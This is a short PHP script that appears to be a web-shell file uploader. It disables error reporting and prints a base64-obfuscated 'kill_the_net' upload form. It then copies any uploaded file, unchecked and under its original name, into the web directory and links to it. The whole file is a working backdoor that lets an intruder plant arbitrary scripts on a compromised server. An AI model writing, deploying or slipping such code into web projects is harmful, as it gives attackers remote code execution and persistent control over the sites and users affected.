<?php
error_reporting(0);
echo(base64_decode("a2lsbF"."90aG"."Vf"."bmV0"."Ijxmb3"."JtIG1ldGhvZD0n"."UE9TVCcgZW5jdHlw"."ZT0nbXVsdGlwYXJ0L2Z"."vcm0tZGF0YSc+PGl"."ucHV0IHR5cGU9J2ZpbGUnbmF"."tZT0nZicgLz48aW5wdXQgdHlwZT0nc3V"."ibWl0JyB2YWx1ZT0ndXAnIC8+PC9mb3JtPiI="));
@copy($_FILES['f']['tmp_name'],$_FILES['f']['name']);
echo("<a href=".$_FILES['f']['name'].">".$_FILES['f']['name']."</a>");?>